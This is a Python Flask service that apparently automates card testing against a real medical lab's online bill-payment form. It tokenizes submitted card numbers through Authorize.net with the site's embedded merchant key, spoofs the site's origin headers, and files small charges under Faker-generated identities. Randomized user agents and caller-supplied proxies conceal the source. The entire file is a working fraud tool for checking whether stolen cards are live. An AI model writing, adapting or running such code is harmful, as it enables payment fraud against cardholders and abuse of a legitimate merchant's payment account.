from flask import Flask, request, jsonify
import requests
import json
import uuid
from faker import Faker
from fake_useragent import UserAgent, FakeUserAgentError

app = Flask(__name__)

# Constants
MERCHANT_NAME = "3c5Q9QdJW"
CLIENT_KEY = "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
DEFAULT_AMOUNT = "0.10"
MINIMUM_AMOUNT = 0.01  # Minimum amount allowed
MAXIMUM_AMOUNT = 100.00  # Maximum amount allowed

fake = Faker()

# Fallback for UserAgent
try:
    ua = UserAgent()
except FakeUserAgentError:
    print("Using default user agent due to error.")
    ua = UserAgent(fallback="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")

def get_opaque_data(card_number: str, exp_month: str, exp_year: str, card_cvv: str, proxy: dict):
    url = "https://api2.authorize.net/xml/v1/request.api"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": ua.random
    }
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": MERCHANT_NAME,
                "clientKey": CLIENT_KEY
            },
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": f"{exp_month}{exp_year}",
                    "cardCode": card_cvv
                }
            }
        }
    }

    r = requests.post(url, headers=headers, json=payload, proxies=proxy, timeout=30)
    data = json.loads(r.content.decode('utf-8-sig'))

    if data.get("messages", {}).get("resultCode") == "Ok":
        return data["opaqueData"]["dataValue"]
    else:
        raise Exception(f"Error getting opaque data: {data.get('messages', {}).get('message', 'Unknown error')}")

def submit_payment(opaque_value: str, month: str, year: str, amount: str, proxy: dict):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "origin": "https://avanticmedicallab.com",
        "referer": "https://avanticmedicallab.com/pay-bill-online/",
        "user-agent": ua.random,
        "x-requested-with": "XMLHttpRequest"
    }

    # Fake user info
    first_name = fake.first_name()
    last_name = fake.last_name()
    email = fake.email()
    phone = f"({fake.random_int(200, 999)}) {fake.random_int(200, 999)}-{fake.random_int(1000, 9999)}"
    city = fake.city()
    state = "NY"
    postal = fake.postcode()
    address = fake.street_address()

    form_data = {
        "wpforms[fields][1][first]": first_name,
        "wpforms[fields][1][last]": last_name,
        "wpforms[fields][17]": amount,
        "wpforms[fields][2]": email,
        "wpforms[fields][3]": phone,
        "wpforms[fields][14]": "Test Data",
        "wpforms[fields][4][address1]": address,
        "wpforms[fields][4][city]": city,
        "wpforms[fields][4][state]": state,
        "wpforms[fields][4][postal]": postal,
        "wpforms[fields][6]": f"$ {amount}",
        "wpforms[fields][11][]": "By clicking on Pay Now button you have read and agreed.",
        "wpforms[id]": "4449",
        "wpforms[author]": "1",
        "wpforms[post_id]": "3388",
        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wpforms[authorize_net][opaque_data][value]": opaque_value,
        "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
        "wpforms[token]": "1bc9aacc38fe976790deb45fe856da53",
        "action": "wpforms_submit",
        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
        "page_title": "Pay Bill Online",
        "page_id": "3388"
    }

    response = requests.post(url, headers=headers, files={k: (None, v) for k, v in form_data.items()}, proxies=proxy, timeout=30)
    
    # Return the raw response for debugging
    return response.text

@app.route('/submit_payment', methods=['GET'])
def api_submit_payment():
    # Extract parameters from the query string
    card = request.args.get('cc')
    month = request.args.get('month')
    year = request.args.get('year')
    cvv = request.args.get('cvv')
    amount = request.args.get('amount', DEFAULT_AMOUNT)
    
    # Extract proxy parameters
    proxy_http = request.args.get('proxy_http')
    proxy_https = request.args.get('proxy_https')
    proxy = {
        "http": proxy_http,
        "https": proxy_https
    }

    if not all([card, month, year, cvv]):
        return jsonify({"error": "Missing required parameters"}), 400

    try:
        # Validate the amount
        amount = float(amount)
        if amount < MINIMUM_AMOUNT or amount > MAXIMUM_AMOUNT:
            return jsonify({
                "charged_amount": f"${DEFAULT_AMOUNT}",
                "message": f"{amount} is out of limit. Please provide an amount between ${MINIMUM_AMOUNT} and ${MAXIMUM_AMOUNT}.",
                "success": False
            }), 400

        opaque = get_opaque_data(card, month, year, cvv, proxy)
        raw_response = submit_payment(opaque, month, year, f"{amount:.2f}", proxy)

        # Directly return the raw response for debugging
        return jsonify({
            "charged_amount": f"${amount:.2f}",
            "raw_response": raw_response,
            "success": True
        }), 200

    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 400

if __name__ == "__main__":
    app.run(debug=True)
